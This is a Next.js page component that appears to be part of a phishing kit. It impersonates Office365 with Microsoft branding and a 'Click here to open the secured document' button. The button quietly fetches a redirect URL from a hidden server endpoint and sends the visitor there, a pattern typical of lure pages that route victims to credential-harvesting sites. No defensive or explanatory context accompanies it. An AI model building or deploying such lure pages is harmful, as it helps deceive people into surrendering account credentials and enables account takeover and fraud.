import { useRouter } from 'next/router';
import Image from 'next/image';
import logo from '../public/logo.png';  // Office365 logo
import logo2 from '../public/logo2.png'; // Secure document button icon

export default function Home() {
  const router = useRouter();

  const handleRedirect = async () => {
    try {
      const res = await fetch('/api/getRedirectUrl'); // Fetch secure redirect URL
      const data = await res.json();
      if (data?.url) {
        window.location.href = data.url; // Redirect securely
      }
    } catch (error) {
      console.error('Failed to fetch redirect URL', error);
    }
  };

  return (
    <div style={{ 
      display: 'flex', 
      flexDirection: 'column', 
      alignItems: 'center', 
      justifyContent: 'center', 
      height: '100vh', 
      textAlign: 'center' 
    }}>
      <h1>Proceed to Office365</h1>
      <Image src={logo} alt="Office365 Logo" width={300} height={300} priority />
      <br />
      <button
        onClick={handleRedirect}
        style={{
          marginTop: '20px',
          padding: '15px 30px',
          fontSize: '18px',
          cursor: 'pointer',
          border: 'none',
          backgroundColor: '#0078D4',
          color: '#fff',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '12px',
          borderRadius: '5px',
          boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)',
        }}
      >
        <Image src={logo2} alt="Secure Document Icon" width={25} height={25} />
        Click here to open the secured document
      </button>
    </div>
  );
}
